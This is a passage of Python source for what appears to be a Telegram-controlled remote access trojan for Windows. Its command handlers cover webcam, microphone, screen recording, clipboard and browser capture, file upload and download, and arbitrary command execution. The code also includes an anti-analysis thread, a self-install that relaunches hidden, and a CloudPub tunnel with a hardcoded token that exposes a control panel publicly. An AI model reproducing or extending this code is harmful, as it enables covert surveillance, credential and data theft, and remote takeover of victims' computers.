    test_results = []
    test_commands = [
        ("status", lambda: "OK" if psutil.cpu_percent() is not None else "FAIL"),
        ("screenshot", lambda: "OK" if take_screenshot() == "screenshot.png" else "FAIL"),
        ("ip", lambda: "OK" if socket.gethostbyname(socket.gethostname()) else "FAIL"),
        ("sysinfo", lambda: "OK" if platform.system() else "FAIL")
    ]
    for name, test_func in test_commands:
        try:
            test_func()
            test_results.append(f"{name}: OK")
        except:
            test_results.append(f"{name}: FAIL")
    await update.message.reply_text("Test results:\n" + "\n".join(test_results))

@restricted
async def hide(update, context):
    global HIDDEN_MODE
    if not context.args or context.args[0] != '!':
        await update.message.reply_text("Usage: /hide !")
        return
    HIDDEN_MODE = True
    await update.message.reply_text("Hidden mode ON. Commands disabled.")
    logger.info("HIDDEN MODE ACTIVATED")

@restricted
async def unhide(update, context):
    global HIDDEN_MODE
    if not context.args or context.args[0] != '!':
        await update.message.reply_text("Usage: /unhide !")
        return
    HIDDEN_MODE = False
    await update.message.reply_text("Hidden mode OFF. Commands enabled.")
    threading.Thread(target=lambda: [time.sleep(2), os.execv(sys.executable, [sys.executable] + sys.argv)]).start()

@restricted
async def relaunch(update, context):
    await update.message.reply_text("Relaunching...")
    os.execv(sys.executable, [sys.executable] + sys.argv)

@restricted
async def web(update, context):
    global WEB_APP, WEB_THREAD, CLOUDPUB_PROCESS

    if WEB_APP:
        await update.message.reply_text("Веб-панель уже запущена.")
        return

    await update.message.reply_text("Запуск веб-панели через CloudPub...")

    def run_web_and_cloudpub():
        global WEB_APP, WEB_THREAD, CLOUDPUB_PROCESS
        try:
            base_dir = INSTALL_DIR
            downloads_dir = os.path.join(base_dir, "Downloads")
            archive_path = os.path.join(downloads_dir, CLOUDPUB_ARCHIVE)
            clo_dir = os.path.join(base_dir, "clo")

            os.makedirs(downloads_dir, exist_ok=True)
            os.makedirs(clo_dir, exist_ok=True)

            if not os.path.exists(archive_path):
                logger.info("CloudPub: downloading...")
                subprocess.run([
                    'curl', '-L', '-o', archive_path,
                    'https://cloudpub.ru/download/stable/clo-2.4.5-stable-windows-x86_64.zip'
                ], capture_output=True, text=True, check=True)

            if not os.path.exists(os.path.join(clo_dir, "clo.exe")):
                logger.info("CloudPub: extracting...")
                ps_script = f'''
                $zipPath = '{archive_path}'
                $extractPath = '{clo_dir}'
                Expand-Archive -Path $zipPath -DestinationPath $extractPath -Force
                '''
                subprocess.run(['powershell', '-Command', ps_script], check=True)

            clo_exe = None
            for root, _, files in os.walk(clo_dir):
                for f in files:
                    if f.lower() == 'clo.exe':
                        clo_exe = os.path.join(root, f)
                        break
                if clo_exe: break
            if not clo_exe:
                logger.error("clo.exe not found")
                return

            result = subprocess.run('netstat -ano | findstr :5000', shell=True, capture_output=True, text=True)
            for line in result.stdout.splitlines():
                if 'LISTENING' in line:
                    pid = line.split()[-1]
                    subprocess.run(['taskkill', '/PID', pid, '/F'], capture_output=True)

            token = 'NuoIZ_5HbXQYQLiYQi-oUlYg2a4zLqqUckk9xBZo4Mo'
            subprocess.run([clo_exe, 'set', 'token', token], cwd=os.path.dirname(clo_exe), check=True)

            CLOUDPUB_PROCESS = subprocess.Popen(
                [clo_exe, 'publish', 'http', '5000'],
                cwd=os.path.dirname(clo_exe),
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                creationflags=subprocess.CREATE_NO_WINDOW  # СКРЫВАЕТ CMD
            )

            url = None
            start_time = time.time()
            while time.time() - start_time < 60:
                line = CLOUDPUB_PROCESS.stdout.readline()
                if line:
                    match = re.search(r'https?://[a-zA-Z0-9-]+\.cloudpub\.ru', line)
                    if match:
                        url = match.group(0)
                        with open(CLOUDPUB_URL_FILE, 'w') as f:
                            f.write(url)
                        break
                line = CLOUDPUB_PROCESS.stderr.readline()
                if line:
                    match = re.search(r'https?://[a-zA-Z0-9-]+\.cloudpub\.ru', line)
                    if match:
                        url = match.group(0)
                        with open(CLOUDPUB_URL_FILE, 'w') as f:
                            f.write(url)
                        break
                time.sleep(0.1)

            if not url:
                logger.error("CloudPub URL not found")
                return

            WEB_APP = create_web_app()
            WEB_THREAD = threading.Thread(target=WEB_APP.run, kwargs={'host': '0.0.0.0', 'port': 5000}, daemon=True)
            WEB_THREAD.start()

            context.bot_data['cloudpub_url'] = url

        except Exception as e:
            logger.error(f"Web+CloudPub error: {e}")

    thread = threading.Thread(target=run_web_and_cloudpub, daemon=True)
    thread.start()

    for _ in range(60):
        if os.path.exists(CLOUDPUB_URL_FILE):
            with open(CLOUDPUB_URL_FILE) as f:
                url = f.read().strip()
            await update.message.reply_text(f"Веб-панель запущена через **CloudPub**!\n\nПубличный URL: {url}\nЛокально: http://127.0.0.1:5000")
            return
        time.sleep(1)

    await update.message.reply_text("CloudPub запущен, но URL ещё не получен. Подожди 10-20 сек.")

@restricted
async def web_status(update, context):
    if os.path.exists(CLOUDPUB_URL_FILE):
        with open(CLOUDPUB_URL_FILE) as f:
            url = f.read().strip()
        await update.message.reply_text(f"Веб-панель активна:\n{url}")
    else:
        await update.message.reply_text("Веб-панель не запущена. Используй /web")

async def unknown(update, context):
    await update.message.reply_text("Unknown. /start")

def run_bot():
    try:
        from telegram.ext import Application, CommandHandler, MessageHandler, filters
        app = Application.builder().token(CURRENT_TOKEN).build()

        handlers = [
            CommandHandler("start", start),
            CommandHandler("status", status),
            CommandHandler("screenshot", screenshot),
            CommandHandler("webcam", webcam),
            CommandHandler("screenrecord", screenrecord),
            CommandHandler("mic", mic),
            CommandHandler("processes", processes),
            CommandHandler("kill", kill),
            CommandHandler("startapp", startapp),
            CommandHandler("ls", ls),
            CommandHandler("download", download),
            CommandHandler("upload", upload),
            CommandHandler("delete", delete),
            CommandHandler("ip", ip),
            CommandHandler("ping", ping),
            CommandHandler("netstat", netstat),
            CommandHandler("run", run_command),
            CommandHandler("schedule", schedule),
            CommandHandler("monitor", monitor),
            CommandHandler("stopmonitor", stopmonitor),
            CommandHandler("sysinfo", sysinfo),
            CommandHandler("browser", browser),
            CommandHandler("clipboard", clipboard),
            CommandHandler("cleanup", cleanup),
            CommandHandler("selfdestruct", selfdestruct),
            CommandHandler("reboot", reboot),
            CommandHandler("shutdown", shutdown),
            CommandHandler("lock", lock),
            CommandHandler("history", history),
            CommandHandler("except", except_cmd),
            CommandHandler("install", install_cmd),
            CommandHandler("changetoken", changetoken),
            CommandHandler("test", test),
            CommandHandler("hide", hide),
            CommandHandler("unhide", unhide),
            CommandHandler("relaunch", relaunch),
            CommandHandler("web", web),
            CommandHandler("web_status", web_status),
            MessageHandler(filters.COMMAND, unknown)
        ]
        for h in handlers:
            app.add_handler(h)

        app.run_polling(drop_pending_updates=True)
    except Exception as e:
        logger.error(f"BOT CRASH: {e}")

if __name__ == "__main__":
    threading.Thread(target=lambda: [anti_analysis(), time.sleep(60)], daemon=True).start()

    if install():
        if (EXE_MODE and sys.executable != INSTALL_PATH) or (not EXE_MODE and CURRENT_SCRIPT != INSTALL_PATH):
            pythonw = shutil.which("pythonw.exe") or r"C:\Python313\pythonw.exe"
            subprocess.Popen([pythonw, INSTALL_PATH], creationflags=subprocess.CREATE_NO_WINDOW)
            sys.exit(0)
        run_bot()
    else:
        time.sleep(30)
        run_bot()